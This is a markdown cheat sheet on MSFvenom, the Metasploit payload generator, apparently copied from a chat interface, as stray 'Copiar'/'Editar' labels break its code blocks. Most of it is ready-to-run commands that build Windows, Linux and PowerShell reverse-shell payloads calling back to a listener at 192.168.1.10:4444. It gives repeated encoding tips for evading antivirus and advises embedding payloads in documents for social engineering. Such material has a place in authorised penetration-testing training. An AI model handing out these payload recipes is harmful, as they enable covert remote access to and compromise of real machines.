# Exploitation: Msfvenom

## Overview
MSFvenom is a versatile payload generator and encoder included in the Metasploit Framework. It allows penetration testers to craft payloads for different platforms, customize payload behavior, and encode or obfuscate them to evade detection.

MSFvenom combines `msfpayload` and `msfencode` into a single tool.

---

## Key Features
- Generate payloads for multiple platforms (Windows, Linux, macOS, Android)
- Encode and obfuscate payloads to bypass antivirus and detection
- Supports multiple formats: `exe`, `elf`, `apk`, `raw`, `python`, `c`, `dll`, etc.
- Flexible configuration options: IP, port, payload type, encoder, iteration
- Integrates easily with Metasploit for automated exploitation

---

## Payload Types

### Windows
- `windows/meterpreter/reverse_tcp` – Meterpreter reverse shell
- `windows/shell/reverse_tcp` – Classic command shell
- `windows/meterpreter/bind_tcp` – Meterpreter bind shell
- `windows/adduser` – Adds a new user to the target system

### Linux
- `linux/x86/meterpreter/reverse_tcp` – Meterpreter reverse shell
- `linux/x86/shell/reverse_tcp` – Standard shell reverse TCP
- `linux/x86/meterpreter/bind_tcp` – Meterpreter bind shell

### Android
- `android/meterpreter/reverse_tcp` – Reverse shell payload
- `android/meterpreter/reverse_http` – Reverse HTTP Meterpreter shell

---

## Encoders and Obfuscation

### Common Encoders
- `x86/shikata_ga_nai` – Polymorphic encoder for x86 payloads (Windows/Linux)
- `x86/countdown` – Simple polymorphic encoder
- `cmd/echo` – Encode payload to safe ASCII commands
- `generic/none` – No encoding (raw payload)

### Obfuscation Tips
- Multiple iterations of encoding can help bypass signature-based antivirus detection:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
Use format options like c, python, or powershell to embed payload in scripts.

Combine with obfuscation tools or packers for additional evasion.

Formats
exe – Windows executable

elf – Linux ELF binary

apk – Android package

raw – Raw payload for shellcode injection

python, perl, c, ruby – Scriptable payloads

dll – Windows library payloads

powershell – Payload suitable for PowerShell execution

Installation
bash
Copiar
Editar
sudo apt update
sudo apt install metasploit-framework

# Verify installation
msfvenom --help
Basic Usage
Windows Example
bash
Copiar
Editar
# Reverse TCP payload for Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Encoded payload to bypass AV
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
Linux Example
bash
Copiar
Editar
# Reverse TCP payload for Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

# Raw shellcode for injection
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.raw
PowerShell / Script Example
bash
Copiar
Editar
# Generate PowerShell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f powershell
Tips
Always test payloads in a controlled lab environment.

Use multi/handler in Metasploit to receive reverse shells.

Multiple encodings can help bypass antivirus but over-encoding can break payloads.

Embed payloads in scripts or documents for social engineering exercises.

Keep MSFvenom and Metasploit updated to use latest exploits and payloads.

References
Metasploit Framework: https://www.metasploit.com

MSFvenom Usage Guide: https://www.offensive-security.com/metasploit-unleashed/msfvenom/